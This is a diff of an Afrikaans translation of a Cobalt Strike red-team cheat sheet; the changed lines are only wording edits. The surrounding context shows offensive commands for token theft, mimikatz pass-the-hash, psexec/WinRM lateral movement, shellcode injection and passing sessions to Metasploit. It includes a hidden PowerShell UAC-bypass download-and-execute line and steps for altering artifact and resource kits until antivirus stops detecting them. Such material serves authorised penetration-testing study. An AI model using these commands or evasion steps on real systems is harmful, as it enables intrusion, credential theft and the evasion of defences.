@@ -8,12 +8,12 @@
 
 ### Peer2Peer Luisteraars
 
-Die beacons van hierdie luisteraars hoef nie direk met die C2 te kommunikeer nie, hulle kan dit deur ander beacons doen.
+Die beacons van hierdie luisteraars hoef nie direk met die C2 te praat nie, hulle kan met dit kommunikeer deur ander beacons.
 
 `Cobalt Strike -> Luisteraars -> Voeg by/Wysig` dan moet jy die TCP of SMB beacons kies
 
 * Die **TCP beacon sal 'n luisteraar in die geselekteerde poort stel**. Om met 'n TCP beacon te verbind, gebruik die opdrag `connect <ip> <port>` vanaf 'n ander beacon
-* Die **smb beacon sal luister in 'n pipenaam met die geselekteerde naam**. Om met 'n SMB beacon te verbind, moet jy die opdrag `link [target] [pipe]` gebruik.
+* Die **smb beacon sal luister in 'n pipename met die geselekteerde naam**. Om met 'n SMB beacon te verbind, moet jy die opdrag `link [target] [pipe]` gebruik.
 
 ### Genereer & Gasheer payloads
 
@@ -73,7 +73,7 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ## Steel token van pid
 ## Soos make_token maar steel die token van 'n proses
 steal_token [pid] # Ook, dit is nuttig vir netwerk aksies, nie plaaslike aksies nie
-## Van die API-dokumentasie weet ons dat hierdie aanmeldtipe "die oproeper toelaat om sy huidige token te kloon". Dit is waarom die Beacon-uitvoer sê Verpersoonlik &#x3C;current_username> - dit verpersoonlik ons eie gekloonde token.
+## Van die API dokumentasie weet ons dat hierdie aanmeldtipe "die oproeper toelaat om sy huidige token te kloon". Dit is waarom die Beacon-uitset sê Verpersoonlik &#x3C;current_username> - dit verpersoonlik ons eie gekloonde token.
 ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang tot C$ in 'n rekenaar te verkry
 rev2self # Stop om die token van steal_token te gebruik
 
@@ -92,7 +92,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pas die hash deur mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Sonder /run, spaw mimikatz 'n cmd.exe, as jy as 'n gebruiker met Desktop loop, sal hy die shell sien (as jy as SYSTEM loop, is jy reg om te gaan)
+## Sonder /run, mimikatz spawn 'n cmd.exe, as jy as 'n gebruiker met Desktop loop, sal hy die shell sien (as jy as SYSTEM loop, is jy reg om te gaan)
 steal_token &#x3C;pid> #Steel token van proses geskep deur mimikatz
 
 ## Pas die kaartjie
@@ -129,8 +129,8 @@ jump [method] [target] [listener]
 ## psexec                    x86   Gebruik 'n diens om 'n Service EXE artefak uit te voer
 ## psexec64                  x64   Gebruik 'n diens om 'n Service EXE artefak uit te voer
 ## psexec_psh                x86   Gebruik 'n diens om 'n PowerShell een-liner uit te voer
-## winrm                     x86   Voer 'n PowerShell skrip uit via WinRM
-## winrm64                   x64   Voer 'n PowerShell skrip uit via WinRM
+## winrm                     x86   Voer 'n PowerShell skrip via WinRM uit
+## winrm64                   x64   Voer 'n PowerShell skrip via WinRM uit
 
 remote-exec [method] [target] [command]
 ## Metodes:
@@ -153,7 +153,7 @@ msf6 exploit(multi/handler) > exploit -j
 
 ## Op cobalt: Luisteraars > Voeg by en stel die Payload op Buitelandse HTTP. Stel die Gasheer op 10.10.5.120, die Poort op 8080 en klik Stoor.
 beacon> spawn metasploit
-## Jy kan slegs x86 Meterpreter sessies met die buitelandse luisteraar spaw.
+## Jy kan slegs x86 Meterpreter sessies met die buitelandse luisteraar spawn.
 
 # Pas sessie na Metasploit - Deur shellcode inspuiting
 ## Op metasploit gasheer
@@ -170,7 +170,7 @@ shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inspuit metasploit shellcode in 'n 
 
 
 # Pivoting
-## Open 'n socks proxy in die teamserver
+## Maak 'n socks proxy in die spanbediener
 beacon> socks 1080
 
 # SSH verbinding
@@ -184,7 +184,7 @@ Gewoonlik in `/opt/cobaltstrike/artifact-kit` kan jy die kode en vooraf-gecompil
 
 Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) met die gegenereerde backdoor (of net met die gecompileerde template) kan jy vind wat die verdediger laat afgaan. Dit is gewoonlik 'n string. Daarom kan jy net die kode wat die backdoor genereer, wysig sodat daardie string nie in die finale binêre verskyn nie.
 
-Na die wysiging van die kode, voer net `./build.sh` uit vanaf dieselfde gids en kopieer die `dist-pipe/` gids na die Windows kliënt in `C:\Tools\cobaltstrike\ArtifactKit`.
+Na die wysiging van die kode, voer net `./build.sh` uit vanaf dieselfde gids en kopieer die `dist-pipe/` vouer na die Windows kliënt in `C:\Tools\cobaltstrike\ArtifactKit`.
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
@@ -200,7 +200,7 @@ Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die sjab
 ```
 Deur die gedetecteerde lyne te wysig, kan 'n sjabloon gegenereer word wat nie gevang sal word nie.
 
-Moet nie vergeet om die aggressiewe skrif `ResourceKit\resources.cna` te laai om Cobalt Strike aan te dui om die hulpbronne van die skyf te gebruik wat ons wil hê en nie diegene wat gelaai is nie.
+Moet nie vergeet om die aggressiewe skrip `ResourceKit\resources.cna` te laai om Cobalt Strike aan te dui om die hulpbronne van die skyf te gebruik wat ons wil hê en nie diegene wat gelaai is nie.
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
